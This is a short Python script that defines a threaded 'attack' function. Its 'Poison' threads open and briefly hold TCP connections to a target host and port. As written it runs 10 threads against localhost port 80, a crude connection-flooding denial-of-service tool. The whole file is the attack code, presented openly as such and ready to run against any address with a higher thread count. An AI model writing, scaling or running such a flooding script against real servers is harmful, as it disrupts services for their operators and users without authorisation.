import socket
import time
import threading

class Poison (threading.Thread):
    def __init__(self, threadID, url, port):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.threadID = threadID

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.connect((self.url, self.port))

        time.sleep(1)

        sock.close()

def attack(url, port, n):
    threads = []
    print("Creating theads...")
    for i in range(n):
        threads.append(Poison(i, url, port))

    print("Starting threads...")
    for thread in threads:
        thread.start()

    print("Waiting for threads...")
    for thread in threads:
        thread.join()

attack("localhost", 80, 10)
            

